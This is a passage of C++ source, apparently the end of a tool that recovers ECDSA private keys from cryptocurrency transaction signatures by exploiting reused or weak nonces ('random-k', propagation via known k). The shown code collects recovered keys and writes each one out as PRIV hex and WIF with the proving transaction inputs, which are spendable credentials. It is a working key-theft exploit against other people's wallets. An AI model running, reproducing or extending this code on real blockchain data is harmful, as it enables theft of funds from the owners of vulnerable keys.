
            // integrate new keys
            int new_keys=0;
            for (auto &pd : found) {
                const string &pub = pd.first;
                const cpp_int &d  = pd.second;
                if (priv_by_pub.count(pub)) continue;
                // find a proof row
                auto itrows = by_pub.find(pub);
                if (itrows==by_pub.end() || itrows->second.empty()) continue;
                string rhex = r_to_hex64(itrows->second[0].r);
                add_recovery(pub, d, rhex, { {itrows->second[0].txid, itrows->second[0].vin} }, "random-k");
                new_keys++;
            }
            if (A.verbose) cout << "[random-k] new keys: " << new_keys << "\n";
        }

        size_t grew_k   = expand_k_from_privs();
        int    grew_key = propagate_with_known_k();
        if (A.verbose) cout << "[iter " << it << "] grew_k=" << grew_k << ", grew_keys=" << grew_key << "\n";
        if (grew_k==0 && grew_key==0 && !(A.scan_random_k>0 && A.force_random_k)) break;
    }

    if (recovered_out.empty()) {
        cout << "No valid recovery (primary/propagation/random-k).\n";
        // still dump recovered_k.jsonl for audit
        ofstream fk(A.out_k);
        for (auto &kv : recovered_k_hex) {
            json j;
            j["r"] = kv.first;
            vector<string> ks(kv.second.begin(), kv.second.end());
            sort(ks.begin(), ks.end());
            j["k_candidates"] = ks;
            fk << j.dump() << "\n";
        }
        return 0;
    }

    // write outputs
    {
        ofstream fo(A.out_json);
        for (auto &j : recovered_out) fo << j.dump() << "\n";
    }
    {
        ofstream ft(A.out_txt);
        for (auto &j : recovered_out) {
            string via;
            auto pf = j["proof"];
            if (pf.is_array()) {
                if (pf.size()==2) {
                    via = pf[0]["txid"].get<string>() + ":" + to_string((int)pf[0]["vin"])
                        + " & " + pf[1]["txid"].get<string>() + ":" + to_string((int)pf[1]["vin"]);
                } else if (pf.size()==1) {
                    via = pf[0]["txid"].get<string>() + ":" + to_string((int)pf[0]["vin"]);
                }
            }
            ft << "PUB=" << j["pubkey"].get<string>()
               << " PRIV=" << j["priv_hex"].get<string>()
               << " WIF="  << j["wif"].get<string>()
               << " R="    << j["r"].get<string>()
               << " via "  << via
               << " ("     << j["method"].get<string>() << ")"
               << "\n";
        }
    }
    {
        ofstream fk(A.out_k);
        for (auto &kv : recovered_k_hex) {
            json j;
            j["r"] = kv.first;
            vector<string> ks(kv.second.begin(), kv.second.end());
            sort(ks.begin(), ks.end());
            j["k_candidates"] = ks;
            fk << j.dump() << "\n";
        }
    }

    if (A.verify_pass) verify_pass(A, rows, priv_by_pub);

    cout << "\nSaved " << recovered_out.size() << " recovery record(s) to:\n";
    cout << "  " << A.out_json << "\n";
    cout << "  " << A.out_txt  << "\n";
    cout << "Saved recovered k candidates per r to: " << A.out_k << "\n";
    return 0;
}
